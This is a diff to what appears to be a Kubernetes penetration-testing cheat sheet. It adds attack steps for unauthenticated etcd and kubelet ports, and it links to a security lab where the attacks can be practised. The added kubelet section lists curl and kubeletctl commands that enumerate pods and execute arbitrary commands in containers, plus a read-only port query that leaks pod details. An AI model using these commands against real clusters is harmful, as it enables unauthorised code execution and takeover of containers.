@@ -52,6 +52,7 @@ In the event that you have create pods access without authentication, see [attac
 The authentication model used by etcd, when supporting a Kubernetes cluster, is relatively straightforward. It uses client certificate authentication where **any** certificate issued by it's trusted CA will provide full access to all data. In terms of attacks, there are two options unauthenticated access and authenticated acces.
 
 ### Unauthenticated Access
+**You can try out this attack using Kube Security Lab, using the etcd-noauth.yml playbook [here](https://github.com/raesene/kube_security_lab)**
 
 A good general test for this is to use curl to access the `/version` endpoint. Although most endpoints don't respond well to curl in etcdv3, this one will and it'll tell you whether unauthenticated access is possible or not.
 
@@ -87,9 +88,51 @@ Whilst you can do this with just curl, it's probably more efficient to use some 
 ---
 
 ## 10250/TCP - kubelet
+**You can try out this attack using Kube Security Lab, using the rwkubelet-noauth.yml playbook [here](https://github.com/raesene/kube_security_lab)**
+
+The main kubelet port will generally be present on all worker nodes, and *may* be present on control plane nodes, if the control plane components are deployed as containers (e.g. with kubeadm). Usually authentication to this port is via client certificates and there's usually no authorization in place.
+
+Trying the following request should either give a 401 (showing that a valid client certificate is required) or return some JSON metrics information (showing you have access to the kubelet port)
+
+```bash
+curl -k https://[IP]:10250/metrics
+```
+
+Assuming you've got access you can then execute commands in any container running on that host. As the kubelet controls the CRI (e.g. Docker) it's typically going to provide privileged access to all the containers on the host.
+
+The easiest way to do this is to use Cyberark's [kubeletctl](https://github.com/cyberark/kubeletctl). First scan the host to show which pods can have commands executed in them
+
+```bash
+kubeletctl scan rce --server [IP]
+```
+
+Then you can use this command to execute commands in one or more of the vulnerable pods. just replace `whoami` with the command of your choice and fill in the details of the target pod, based on the information returned from the scan command
+
+```bash
+ kubeletctl run "whoami" --namespace [NAMESPACE] --pod [POD] --container [CONTAINER] --server [IP]
+```
+
+If you don't have `kubeletctl` available but do have `curl` you can use it to do the same thing. First get the pod listing
+
+```bash
+curl -k https://[IP]:10250/pods/ | jq
+```
+
+From that pull out the namespace, pod name and container name that you want to run a command in, then issue this command filling in the blanks appropriately
+
+```bash
+https://[IP]:10250/run/[Namespace]/[Pod]/[Container] -k -XPOST -d "cmd=[COMMAND]"
+```
 
 ---
 
 ## 10255/TCP - kubelet read-only
 
+The kubelet read-only port is generally only seen on older clusters, but can provide some useful information disclosure if present. It's an HTTP API which will have no encryption and no authentication requirements on it, so it's easy to interact with.
 
+The most useful endpoint will be `/pods/` so retrieving it using curl (as below) and looking at the output for useful information, is likely to be the best approach.
+
+
+```bash
+curl http://[IP]:10255/pods/ | jq
+```
